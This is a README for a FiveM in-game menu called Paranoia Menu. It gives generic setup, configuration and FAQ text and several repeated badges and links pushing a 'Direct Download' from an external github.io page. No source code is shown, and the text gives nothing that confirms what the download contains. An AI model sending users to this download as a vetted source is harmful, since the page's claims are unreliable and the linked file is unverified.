# Paranoia Menu v2026 - Game Script Utility 2026

> A FiveM menu utility built around a DUI-based interface and HTML-driven presentation for in-game menu interaction.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felix-gray34/paranoia-menu-update-hub?style=flat-square)](https://github.com/felix-gray34/paranoia-menu-update-hub)

---

<p align="center">
  <a href="https://felix-gray34.github.io/paranoia-menu-update-hub/">
    <img src="https://img.shields.io/badge/Download-Paranoia%20Menu%20Script-brightgreen?style=for-the-badge" alt="Download Paranoia Menu Script">
  </a>
</p>

> **[Direct Download - Paranoia Menu](https://felix-gray34.github.io/paranoia-menu-update-hub/)**

---

[Download Latest Build](https://felix-gray34.github.io/paranoia-menu-update-hub/)

---

## What this project is

Paranoia Menu is a FiveM menu package built to present its interface inside the game through DUI and HTML. It is a fit for setups that want the menu experience embedded directly in the FiveM client instead of relying on an outside application, keeping the whole interaction close to the game environment.

This repository is centered on how the menu is shown and managed. That makes it useful for structuring interactive choices, surfacing controls, and creating a custom player menu panel. In practice, changes to the project will usually be tied to interface behavior, visual layout adjustments, and HTML-based menu rendering.

---

## Script Features

- FiveM-targeted menu utility
- DUI-based interface rendering
- HTML-driven menu presentation
- In-game UI integration
- Lightweight script-style structure
- Suitable for custom menu layouts
- Can be adapted for different interaction flows
- Built around client-side display elements

---

## Setup

1. Download the latest build from the project page.
2. Place the folder in your FiveM resources directory, using the suggested folder name if needed.
3. Add the resource to your server configuration.
4. Start the resource and load the menu in-game according to your own integration flow.

Example resource entry:

start paranoia-menu

If your build includes HTML assets, keep the interface files in the expected web or UI directory so the DUI display can load correctly.

---

## Configuration

Typical settings can cover menu state, interface behavior, and the key or trigger used to open the UI. These values are set in the script files included with your build.

| Setting | Purpose | Example |
| --- | --- | --- |
| `menuEnabled` | Turns the menu on or off | `true` |
| `openKey` | Key used to open the menu | `F2` |
| `uiTheme` | Selects the HTML UI style | `default` |
| `debugMode` | Enables extra logging | `false` |

If your version exposes additional HTML or DUI settings, keep those aligned with the resource path and the browser-based interface files.

---

## Compatibility

Paranoia Menu is built for FiveM and uses DUI plus HTML assets as the interface layer. It is mainly intended for server environments that allow custom UI resources and follow standard FiveM resource loading patterns.

Known limitations may include:
- Requires the resource to be placed in the correct folder structure
- DUI/UI assets must be reachable from the script
- Behavior can vary based on your FiveM build and server-side setup

---

## FAQ

### How do I install it?
Download the build, place it inside your FiveM resources folder, and start it from your server configuration.

### Can I change the interface?
Yes. Since the project uses HTML and DUI, you can adjust the layout and presentation through the included UI files and related script settings.

### How do updates work?
Replace the old resource files with the newer release and review any changed configuration values before restarting the resource.

### Is it only for one game mode?
No. It is a menu utility for FiveM, so it can be adapted to different server flows as long as the integration matches your setup.

### Where should the files be stored?
Keep the resource in a dedicated folder such as `paranoia-menu` so the server can load the script and its UI assets together.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
